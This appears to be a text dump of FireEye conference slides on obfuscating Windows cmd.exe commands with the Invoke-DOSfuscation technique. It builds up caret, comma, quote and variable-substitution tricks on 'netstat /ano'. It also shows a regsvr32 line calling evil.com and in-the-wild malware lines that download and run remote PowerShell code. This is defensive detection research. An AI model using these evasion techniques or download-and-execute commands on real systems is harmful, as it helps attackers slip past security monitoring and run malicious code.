· More examples: · wscript.exe /nologo ... · powershell.exe -nop -noni -enc ... · regsvr32.exe /s /n /u /i:https://evil.com/a scrobj.dll
85 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
· More examples: · wscript.exe -nologo ... · powershell.exe -nop -noni -enc ... · regsvr32.exe /s /n /u /i:https://evil.com/a scrobj.dll
86 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
· More examples: · wscript.exe -nologo ... · powershell.exe /nop /noni /enc ... · regsvr32.exe /s /n /u /i:https://evil.com/a scrobj.dll
87 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
· More examples: · wscript.exe -nologo ... · powershell.exe /nop /noni /enc ... · regsvr32.exe -s -n -u -i:https://evil.com/a scrobj.dll
88 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
· More examples: · wscript.exe -nologo ... · powershell.exe /nop /noni /enc ... · regsvr32.exe -s -n -u -i:https://evil.com/a scrobj.dll
89 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c netstat /ano
­ and / interchangeability
· More examples: · wscript.exe -nologo ... · powershell.exe /nop /noni /enc ... · regsvr32.exe -s -n -u -i:https:\\evil.com\a scrobj.dll
90 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c netstat /ano

­ and / interchangeability

· More examples: · wscript.exe -nologo ... · powershell.exe /nop /noni /enc ... · regsvr32.exe -s -n -u -i:https:\\evil.com\a scrobj.dll

https://i.imgur.com/8oXBdLG.gif

91 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com=netstat /ano&&echo %com%"
92 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com=netstat /ano&&echo %com%"
93 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com=netstat /ano&&call %com%"
94 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com=netstat /ano&&call %com%"
95 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com1=net&&set com2=stat&&set com3= /ano&&call
%com1%%com2%%com3%"
96 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com1=net&&set com2=stat&&set com3= /ano&&call
%com1%%com2%%com3%"

http://www.danielbohannon.com/blog-1/2018/3/19/test-your-dfir-tools-sysmon-edition

DETOUR

#TestYourTools: · Sysmon EID 1 CommandLine adds duplicate %'s
· EventVwr.exe · PowerShell's Get-WinEvent

97 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com1=net&&set com2=stat&&set com3= /ano&&call
%com1%%com2%%com3%" · Reorder substrings · Set into single final env var
98 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call
%com1%%com2%%com3%" · Reorder substrings · Set into single final env var
99 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%" · Reorder substrings · Set into single final env var
100 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax
1. 2. 3. 4. 5.

Invoke-DOSfuscation arguments
1. 2. 3. 4. 5.

101 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax
1. call %final% 2. 3. 4. 5.

Invoke-DOSfuscation arguments
1. (default when possible) 2. 3. 4. 5.

102 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax
1. call %final% 2. cmd /c %final% 3. 4. 5.

Invoke-DOSfuscation arguments
1. (default when possible) 2. -FinalBinary cmd 3. 4. 5.

103 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax
1. call %final% 2. cmd /c %final% 3. call echo %final% | cmd 4. 5.

Invoke-DOSfuscation arguments
1. (default when possible) 2. -FinalBinary cmd 3. -FinalBinary cmd -StdIn 4. 5.

104 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax
1. call %final% 2. cmd /c %final% 3. call echo %final% | cmd 4. call powershell "%final%" 5.

Invoke-DOSfuscation arguments
1. (default when possible) 2. -FinalBinary cmd 3. -FinalBinary cmd -StdIn 4. -FinalBinary PowerShell 5.

105 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%"

Final syntax

Invoke-DOSfuscation arguments

1. call %final%

1. (default when possible)

2. cmd /c %final%

2. -FinalBinary cmd

3. call echo %final% | cmd

3. -FinalBinary cmd -StdIn

4. call powershell "%final%"

4. -FinalBinary PowerShell

5. call echo %final% | powershell - 5. -FinalBinary PowerShell -StdIn

106 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call set
final=%com1%%com2%%com3%&&call %final%" Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...
107 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· CMd /C "sEt coM3= /ano&&SEt cOm2=stat&&seT CoM1=net&&caLl SeT
fiNAl=%COm1%%cOm2%%coM3%&&cAlL %FinAl%"

· Random case · · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

108 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· CMd/C"sEt coM3= /ano&&SEt cOm2=stat&&seT CoM1=net&&caLl SeT
fiNAl=%COm1%%cOm2%%coM3%&&cAlL %FinAl%"

· Random case · Whitespace (-/+) · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

109 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· CMd /C " sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl
SeT fiNAl=%COm1%%cOm2%%coM3%&& cAlL %FinAl% "

· Random case · Whitespace (-/+) · · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

110 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,CMd,; ,/C ", ;, ;sEt coM3= /ano&&,,,SEt cOm2=stat&&;;;seT CoM1=net&&, ;caLl,;,SeT fiNAl=%COm1%%cOm2%%coM3%&&; , ,cAlL, ;, ;%FinAl% "

· Random case · Whitespace (-/+) · Comma & semicolon · ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

111 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ;, ;s^Et ^ ^ co^M3=^^ /^^an^o&&,,,S^Et^ ^ ^cO^m2=^s^^ta^^t&&;;;s^eT^ ^ C^oM1^=^n^^et&&, ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%&&; , ,c^AlL^, ;,^ ;%Fi^nAl^% "

· Random case · Whitespace (-/+) · Comma & semicolon · Caret ·

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

112 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^et) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "

· Random case · Whitespace (-/+) · Comma & semicolon · Caret · Parentheses

Invoke-DOSfuscation functions also wrap all the building block techniques into each input command...

113 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^et) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "
netstat /ano CMd ,; ,/C ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^et) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%%COm1^%%%%c^Om2%%^%%c^oM3^%%))&&; (, ,(c^AlL^, ;,^ ;%%Fi^nAl^%%) ) "
114 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e""t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "
ne""tstat /ano CMd ,; ,/C ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e""t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%%COm1^%%%%c^Om2%%^%%c^oM3^%%))&&; (, ,(c^AlL^, ;,^ ;%%Fi^nAl^%%) ) "
115 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e""t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "
ne""tstat /ano vs
n"e"tstat /ano
116 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n"^^e"t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "
ne""tstat /ano vs
n"e"tstat /ano
117 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
 · ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n"^^e"t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "

If we have to pair double quotes, how can we unpair
in final variable?

ne""tstat /ano vs
n"e"tstat /ano

118 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n"^^e"t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "

· Steps for unpaired quotes 1. 2. 3. 4.

ne""tstat /ano vs
n"e"tstat /ano

119 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. 3. 4.

ne""tstat /ano vs
n"e"tstat /ano

120 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. 4.

ne""tstat /ano vs
n"e"tstat /ano

121 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^

^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, ((

;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^

;%Fi^nAl^

%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4.

ne""tstat /ano vs
n"e"tstat /ano

122 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^

^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, ((

;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^

;%Fi^nAl^:""=

%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4.

ne""tstat /ano vs
n"e"tstat /ano

123 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=%quotes:~0,1%%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4.

ne""tstat /ano vs
n"e"tstat /ano

124 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, ((
  ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^
;%Fi^nAl^:""=%quotes:~0,1%%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4.

ne""tstat /ano vs
n"e"tstat /ano

125 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=%quotes:~0,1%%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. ???

ne""tstat /ano vs
n"e"tstat /ano

126 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://i.imgur.com/PD9klNV.jpg

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. ???

ne""tstat /ano vs
n"e"tstat /ano

127 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://i.imgur.com/PD9klNV.jpg

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "
· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. ???
128 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. ???

https://pbs.twimg.com/media/DHCh2GvW AAUevcd.jpg:large

129 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. Variable expansion

· /V:ON · /V:O · /V: · /V

https://pbs.twimg.com/media/DHCh2GvW AAUevcd.jpg:large

130 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "

· Steps for unpaired quotes 1. Double up quotes 2. Set quotes in env var 3. Char substitution 4. Variable expansion

· /V:ON · /V:O · /V: · /V · /VISTA · /VM · /V*

https://pbs.twimg.com/media/DHCh2GvW AAUevcd.jpg:large

131 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n""^^e""t) ) &&set quotes=""&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^:""=!quotes:~0,1!%) ) "
· Env var names can be: 1. 2.
132 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ --$#$--=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^!!#**#!!=^s^^ta^^t)&&(;(;;s^eT^ ^ .........=^n""^^e""t) ) &&set ;;;;;;;;;=""&&, (( ;c^aLl,^;,S^e^T ^ ^ '''''''''''''''=^%.........%%!!#**#!!%^%--$#$--%))&&; (, ,(c^AlL^, ;,^ ;%''''''''''''''':""=!;;;;;;;;;:~0,1!%) ) "
· Env var names can be: 1. Special characters 2.
133 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation
· ;,,C^Md^,; /VISTA ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ ' =^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^' =^s^^ta^^t)&&(;(;;s^eT^ ^ ' =^n""^^e""t) ) &&set ' =""&&, (( ;c^aLl,^;,S^e^T ^ ^ ' =^%' %%' %^%' %))&&; (, ,(c^AlL^, ;,^ ;%' :""=!' :~0,1!%) ) "
· Env var names can be: 1. Special characters 2. Whitespace
134 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation

135 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

https://i.imgflip.com/rjkyg.jpg

Payload Obfuscation 1 of 4: Concatenation (ITW 1/3)
· Concatenation examples in the wild (1/3): ..\..\..\..\Windows\System32\cmd.exe /c "set da=wersh&& set gg=ell&& set c0=po&&" cmd /c %c0%%da%%gg% -nonI -eP bypass -c iEx ((n`eW-OBjECt ('n'+'Et.w'+'EbclIe'+'nT')).('do'+'wNlo'+'adst'+'ring').Invoke(('h'+$s4+'t'+'t'+$o8 +'ps://'+...
Invoke-Obfuscation payload
136 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation (ITW 2/3)
· Concatenation examples in the wild (2/3):
CmD wMic & %Co^m^S^p^Ec^% /V /c set %binkOHOTJcSMBkQ%=EINhmPkdO&&set %kiqjRiiiH%=owe^r^s&&set %zzwpVwCTCRDvTBu%=pOwoJiQoW&&set %CdjPuLtXi%=p&&set %GKZajcAqFZkRLZw%=NazJjhVlGSrXQvT&&set %QiiPPcnDM%=^he^l^l&&set %jiIZiKXbkZQMpuQ%=dipAbiiHEplZSHr&&!%CdjPuLtXi%!!%kiqjRiiiH%!!%QiiP PcnDM%! ".( $VeRbOsePReFEREncE.tOstRinG()[1,3]+'x'-jOin'') ( ('. ( ctVpshoME[4]+ctVPsHomE[34]+VnLXVnL)
Invoke-Obfuscation payload
137 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 1 of 4: Concatenation (ITW 3/3)
· Concatenation examples in the wild (3/3):
cmd.exe /C "cm^d^.^e^x^e /V^ ^/C s^et g^c^=^er^s^&^&s^e^t ^tf=^he^ll^&^&set^ f^a^=^pow^&^&^s^et^ dq^=W^i^n^do^ws^!fa^!^!g^c^!!^t^f^!\^v^1^.0\^!^fa!^!^gc!!^tf^!^&^&^ ech^o^ iE^X^(^^"iex(neW-OBjecT nEt.webCLiEnt).dowNlOaDstrING('https://REDACTED')^"^)^;^ ^|^ !dq! -^no^p^ ^-^w^i^n^ ^1^ ^-"
!dq! == WindowsPowerShell\v1.0\powershell
138 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Last of ITW... Unseen Techniques Up Ahead!
139 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED. https://f.fwallpapers.com/images/funny-bear.jpg

Last of ITW... Unseen Techniques Up Ahead!
For the past 9 months I have hunted across: · Public file repositories · Private file repositories · Sandbox execution reports · Endpoint detections for 10+
million endpoints
140 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED. https://f.fwallpapers.com/images/funny-bear.jpg

Payload Obfuscation 2 of 4: FORcoding
FOR Score
And Seven Obfuscation Techniques Ago...
https://www.whitehouse.gov/sites/whitehouse.gov/files/images/first-family/16_abraham_lincoln%5B1%5D.jpg 141 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
142 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /c netstat /ano
143 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /c netstat /ano
· /V · /V:ON · /VERBOSE · /V::::::::::: · /V===== · /V_-/\-_
144 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /c netstat /ano
145 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /c netstat /ano
#ForCompatibilityReasons #RisthenewC
146 COPYRIGHT © 2018, FIREEYE, INC. ALL RIGHTS RESERVED.

Payload Obfuscation 2 of 4: FORcoding
· cmd /v /c netstat /ano
